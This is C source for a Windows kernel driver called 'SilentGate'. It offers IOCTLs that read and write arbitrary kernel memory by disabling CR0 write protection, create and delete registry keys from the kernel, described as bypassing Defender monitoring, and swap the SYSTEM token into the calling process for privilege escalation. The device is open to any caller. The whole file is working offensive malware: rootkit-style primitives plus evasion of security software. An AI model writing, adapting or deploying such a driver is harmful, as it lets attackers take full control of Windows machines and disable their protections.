/*
 * SilentGate v9.0/v10.0 - Custom Kernel Driver
 * Author: JarDani
 * IOCTL 0x900 - Read virtual memory
 * IOCTL 0x901 - Write virtual memory  
 * IOCTL 0x902 - Write registry key (bypasses Defender monitoring)
 */
#include <ntddk.h>

#define DEVICE_NAME     L"\\Device\\SilentGate"
#define SYMBOLIC_NAME   L"\\DosDevices\\SilentGate"

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_REG_WRITE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_REG_DELETE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_STEAL_TOKEN   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x904, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
    ULONG64 address;
    ULONG   size;
    UCHAR   data[256];
} SG_MEM_REQUEST;

/* Registry write request */
typedef struct {
    WCHAR key_path[512];    /* Full registry key path */
    WCHAR value_name[128];  /* Value name */
    WCHAR value_data[512];  /* Value data (REG_SZ) */
    ULONG value_type;       /* REG_SZ=1, REG_DWORD=4 */
} SG_REG_REQUEST;

PDEVICE_OBJECT g_DevObj = NULL;

/* Read kernel virtual memory */
NTSTATUS sg_read_virtual(ULONG64 address, PVOID buffer, ULONG size) {
    RtlCopyMemory(buffer, (PVOID)address, size);
    return STATUS_SUCCESS;
}

/* Write kernel virtual memory */
NTSTATUS sg_write_virtual(ULONG64 address, PVOID buffer, ULONG size) {
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    ULONG64 cr0 = __readcr0();
    __writecr0(cr0 & ~0x10000ULL);
    _mm_sfence();
    RtlCopyMemory((PVOID)address, buffer, size);
    _mm_sfence();
    __writecr0(cr0);
    KeLowerIrql(irql);
    return STATUS_SUCCESS;
}

/* Write registry value directly in kernel - bypasses user-mode monitoring */
NTSTATUS sg_reg_write(SG_REG_REQUEST* req) {
    UNICODE_STRING key_path;
    RtlInitUnicodeString(&key_path, req->key_path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &key_path,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hKey = NULL;
    ULONG disposition = 0;

    /* Create or open key */
    NTSTATUS status = ZwCreateKey(&hKey, KEY_ALL_ACCESS, &oa,
        0, NULL, REG_OPTION_NON_VOLATILE, &disposition);

    if (!NT_SUCCESS(status)) {
        /* Try opening existing key */
        status = ZwOpenKey(&hKey, KEY_ALL_ACCESS, &oa);
        if (!NT_SUCCESS(status)) return status;
    }

    /* Set value */
    UNICODE_STRING val_name;
    RtlInitUnicodeString(&val_name, req->value_name);

    if (req->value_type == REG_SZ) {
        ULONG data_size = (ULONG)(wcslen(req->value_data) + 1) * sizeof(WCHAR);
        status = ZwSetValueKey(hKey, &val_name, 0,
            REG_SZ, req->value_data, data_size);
    } else if (req->value_type == REG_DWORD) {
        ULONG dword_val = 0;
        status = ZwSetValueKey(hKey, &val_name, 0,
            REG_DWORD, &dword_val, sizeof(ULONG));
    }

    ZwClose(hKey);
    return status;
}

/* Delete registry key */
NTSTATUS sg_reg_delete(SG_REG_REQUEST* req) {
    UNICODE_STRING key_path;
    RtlInitUnicodeString(&key_path, req->key_path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &key_path,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = ZwOpenKey(&hKey, KEY_ALL_ACCESS, &oa);
    if (!NT_SUCCESS(status)) return status;

    status = ZwDeleteKey(hKey);
    ZwClose(hKey);
    return status;
}

/* Kernel function declarations */
NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS* Process);
PACCESS_TOKEN PsReferencePrimaryToken(PEPROCESS Process);
VOID PsDereferencePrimaryToken(PACCESS_TOKEN Token);
PEPROCESS IoGetCurrentProcess(VOID);

/* Steal SYSTEM token and inject into calling process */
NTSTATUS sg_steal_system_token(PIRP Irp) {
    /* Walk EPROCESS list to find System process (PID 4) */
    PEPROCESS SystemProcess = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);
    if (!NT_SUCCESS(status)) return status;

    /* Get System token */
    PACCESS_TOKEN SystemToken = PsReferencePrimaryToken(SystemProcess);
    ObDereferenceObject(SystemProcess);

    /* Get calling process */
    PEPROCESS CallerProcess = IoGetCurrentProcess();
    if (!CallerProcess) {
        PsDereferencePrimaryToken(SystemToken);
        return STATUS_UNSUCCESSFUL;
    }

    /* Token offset in EPROCESS - Windows 10 22H2 */
    #define EPROCESS_TOKEN_OFFSET 0x4B8

    /* Read current token */
    ULONG64* TokenPtr = (ULONG64*)((UCHAR*)CallerProcess + EPROCESS_TOKEN_OFFSET);
    ULONG64 OldToken = *TokenPtr;

    /* Write System token - preserve lower bits (RefCnt flags) */
    ULONG64 NewToken = ((ULONG64)SystemToken & ~0xFULL) | (OldToken & 0xFULL);
    *TokenPtr = NewToken;

    PsDereferencePrimaryToken(SystemToken);
    return STATUS_SUCCESS;
}

NTSTATUS sg_ioctl(PDEVICE_OBJECT DevObj, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code  = stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID buf   = Irp->AssociatedIrp.SystemBuffer;
    ULONG in_len  = stack->Parameters.DeviceIoControl.InputBufferLength;
    ULONG out_len = stack->Parameters.DeviceIoControl.OutputBufferLength;

    NTSTATUS status = STATUS_INVALID_PARAMETER;
    ULONG bytes = 0;

    if (code == IOCTL_SG_READ_VIRTUAL && in_len >= sizeof(SG_MEM_REQUEST)) {
        SG_MEM_REQUEST* req = (SG_MEM_REQUEST*)buf;
        if (out_len >= req->size) {
            status = sg_read_virtual(req->address, buf, req->size);
            if (NT_SUCCESS(status)) bytes = req->size;
        }
    }
    else if (code == IOCTL_SG_WRITE_VIRTUAL && in_len >= sizeof(SG_MEM_REQUEST)) {
        SG_MEM_REQUEST* req = (SG_MEM_REQUEST*)buf;
        status = sg_write_virtual(req->address, req->data, req->size);
    }
    else if (code == IOCTL_SG_REG_WRITE && in_len >= sizeof(SG_REG_REQUEST)) {
        status = sg_reg_write((SG_REG_REQUEST*)buf);
        bytes = 0;
    }
    else if (code == IOCTL_SG_STEAL_TOKEN) {
        status = sg_steal_system_token(Irp);
    }
    else if (code == IOCTL_SG_REG_DELETE && in_len >= sizeof(SG_REG_REQUEST)) {
        status = sg_reg_delete((SG_REG_REQUEST*)buf);
        bytes = 0;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytes;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS sg_create_close(PDEVICE_OBJECT DevObj, PIRP Irp) {
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID sg_unload(PDRIVER_OBJECT DriverObj) {
    UNICODE_STRING symlink = RTL_CONSTANT_STRING(SYMBOLIC_NAME);
    IoDeleteSymbolicLink(&symlink);
    if (g_DevObj) IoDeleteDevice(g_DevObj);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObj, PUNICODE_STRING RegPath) {
    UNICODE_STRING devname = RTL_CONSTANT_STRING(DEVICE_NAME);
    UNICODE_STRING symlink = RTL_CONSTANT_STRING(SYMBOLIC_NAME);

    NTSTATUS status = IoCreateDevice(DriverObj, 0, &devname,
        FILE_DEVICE_UNKNOWN, 0, FALSE, &g_DevObj);
    if (!NT_SUCCESS(status)) return status;

    IoCreateSymbolicLink(&symlink, &devname);

    DriverObj->MajorFunction[IRP_MJ_CREATE]         = sg_create_close;
    DriverObj->MajorFunction[IRP_MJ_CLOSE]          = sg_create_close;
    DriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = sg_ioctl;
    DriverObj->DriverUnload                          = sg_unload;

    g_DevObj->Flags &= ~DO_DEVICE_INITIALIZING;
    return STATUS_SUCCESS;
}
/* This won't work as append - rewriting key section */
